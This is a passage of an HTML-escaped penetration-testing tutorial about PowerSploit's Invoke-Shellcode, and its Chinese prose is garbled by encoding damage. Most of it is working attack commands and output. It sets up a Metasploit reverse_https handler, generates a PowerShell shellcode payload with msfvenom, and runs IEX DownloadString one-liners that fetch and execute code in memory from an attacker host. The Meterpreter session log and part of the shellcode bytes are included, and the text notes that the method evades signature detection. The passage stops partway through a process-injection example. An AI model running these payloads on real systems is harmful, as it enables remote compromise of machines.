&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€ Recon           //ä»¥ç›®æ ‡ä¸»æœºä¸ºè·³æ¿è¿›è¡Œå†…ç½‘ä¿¡æ¯ä¾¦æŸ¥
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€ ScriptModification  //åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆ›å»ºæˆ–ä¿®æ”¹è„šæœ¬
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€ Tests
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿è¿œç¨‹å»åˆ©ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ”»å‡»æœºï¼ˆKaliï¼‰ä¸­å¼€å¯ä¸€ä¸ªHttpæœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨pythonæ¥å»ºç«‹ä¸€ä¸ªç®€æ˜“çš„HTTPæœåŠ¡å™¨,åœ¨æˆ‘ä»¬çš„PowerSploitç›®å½•ä¸‹æ‰§è¡Œï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Python2&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -m SimpleHTTPServer &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Python3&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -m http.server
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬è®¿é—®http://172.16.0.107:8000/ï¼ˆå› ä¸ºæˆ‘çš„kaliæ”»å‡»æœºIPæ˜¯172.16.0.107ï¼Œå¯ä»¥æ‰§è¡Œifconfigè¿›è¡ŒæŸ¥çœ‹IPï¼‰&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;æ”»å‡»å®æˆ˜&#34;&gt;æ”»å‡»å®æˆ˜&lt;/h2&gt;
&lt;h3 id=&#34;invoke-shellcode&#34;&gt;Invoke-Shellcode&lt;/h3&gt;
&lt;p&gt;CodeExecutionæ¨¡å—ä¸‹çš„Invoke-Shellcodeè„šæœ¬å¸¸ç”¨äºå°†Shellcodeæ’å…¥æŒ‡å®šçš„è¿›ç¨‹IDæˆ–æœ¬åœ°PowerShellä¸­ï¼Œä¸‹é¢ä»‹ç»ä¸¤ç§å¸¸ç”¨çš„åå¼¹Meterpreter Shellæ–¹æ³•ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ç›´æ¥æ‰§è¡Œshellcodeåå¼¹Meterpreter Shell&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kali@kali:~# sudo msfconsole
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 &amp;gt; use exploit/multi/handler
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_https
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; windows/meterpreter/reverse_https
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LHOST 172.16.0.107 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 172.16.0.107
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; LPORT &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name  Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----  ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/meterpreter/reverse_https&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name      Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----      ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   EXITFUNC  process          yes       Exit technique &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Accepted: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh, thread, process, none&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LHOST     172.16.0.107   yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; listener hostname
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LPORT     &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;             yes       The &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; listener port
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LURI                       no        The HTTP Path
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Exploit target:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Id  Name
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   --  ----
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Wildcard Target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf5 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://172.16.0.107:4444
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨msfvenomå‘½ä»¤ç”Ÿæˆä¸€ä¸ªpowershellè„šæœ¬æœ¨é©¬:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„è¿™é‡Œçš„&lt;code&gt;x64&lt;/code&gt;ï¼Œå¦‚æœåœ¨64ä½ç³»ç»Ÿä¸åŠ ä¸Šè¿™ä¸ªçš„è¯ä¼šå‡ºç°powershellåœæ­¢å·¥ä½œ:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/tools/windows/PowerSploit&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ msfvenom -p windows/x64/meterpreter/reverse_https &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.0.107 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -f powershell -o /home/kali/tools/windows/PowerSploit/test                                                                                          &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::ModulE:&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;Platform::Windows from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;No encoder specified, outputting raw payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload sizE:&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;784&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Final size of powershell filE:&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3845&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Saved as: /home/kali/tools/windows/PowerSploit/test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ç€åœ¨ç›®æ ‡æœºPowershellä¸‹è¾“å…¥ä»¥ä¸‹å‘½ä»¤ä¸‹è½½è¯¥è„šæœ¬:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/CodeExecution/Invoke-Shellcode.ps1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;DownloadString()&lt;/code&gt;å¹¶ä¸ä¼šå°†æ–‡ä»¶ä¸‹è½½åˆ°ç£ç›˜ä¸­ï¼Œç›¸åï¼Œè¯¥æ–¹æ³•ä¼šå°†è¿œç¨‹æ–‡ä»¶çš„å†…å®¹ç›´æ¥è½½å…¥å—å®³è€…ä¸»æœºçš„å†…å­˜ä¸­ã€‚è¿™äº›æ–‡ä»¶é€šå¸¸ä¸ºæ¶æ„è„šæœ¬ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨Powershellçš„&lt;code&gt;â€“Command&lt;/code&gt;å‚æ•°åœ¨å†…å­˜ä¸­ç›´æ¥æ‰§è¡Œè¿™äº›æ–‡ä»¶ã€‚æ— æ–‡ä»¶æ¶æ„è½¯ä»¶ä¸­ç»å¸¸ç”¨åˆ°è¿™ç§æŠ€æœ¯ï¼Œä»¥ä¾¿åœ¨å†…å­˜ä¸­ç›´æ¥æ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œè€Œæ— éœ€å°†ä»»ä½•æ–‡ä»¶ä¿å­˜åˆ°ç£ç›˜ä¸­ã€‚æ”»å‡»è€…ç»å¸¸ä½¿ç”¨è¿™ç§æŠ€æœ¯æ¥ç»•è¿‡åŸºäºç‰¹å¾çš„æ£€æµ‹æœºåˆ¶ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ¥ç€è¾“å…¥ä»¥ä¸‹å‘½ä»¤ä¸‹è½½æœ¨é©¬:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/test&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ç€åœ¨powershellä¸‹è¿è¡Œå¦‚ä¸‹å‘½ä»¤:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-Shellcode&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Shellcode&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„msfå·²ç»ä¸Šçº¿äº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit(multi/handler) &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Started HTTPS reverse handler on https://172.16.0.107:4444
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: j37aqvzr) Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: j37aqvzr) Staging x64 payload (201308 bytes) ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: j37aqvzr) Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Meterpreter session 1 opened (172.16.0.107:4444 -&amp;gt; 127.0.0.1 ) at 2022-01-17 17:02:57 +0800
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; sysinfo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Computer        : WIN-I1OIAEUTNT1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OS              : Windows 2016+ (10.0 Build 14393).
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Architecture    : x64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System Language : zh_CN
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Domain          : WORKGROUP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Logged On Users : 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Meterpreter     : x64/windows
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;è¿™é‡Œçš„&lt;code&gt;-Force&lt;/code&gt; æ„æ€æ˜¯ä¸ç”¨æç¤ºï¼Œç›´æ¥æ‰§è¡Œ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$buf&lt;/code&gt;æ˜¯è¦æ‰§è¡Œçš„å†…å®¹ï¼Œå¯ä»¥åœ¨kaliä¸Šé¢çœ‹testçš„å†…å®¹&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/tools/windows/PowerSploit&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ cat &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Byte&lt;span class=&#34;o&#34;&gt;[]]&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;æŒ‡å®šè¿›ç¨‹æ³¨å…¥shellcodeåå¼¹Meterpreter Shell&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åŒæ ·å…ˆåœ¨ç›®æ ‡æœºPowershellä¸‹è¾“å…¥å‘½ä»¤ä¸‹è½½è„šæœ¬å’Œæœ¨é©¬:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS E:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; IEX &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.DownloadString&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/CodeExecution/Invoke-Shellcode.ps1&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS E:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; IEX &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.DownloadString&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/test&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
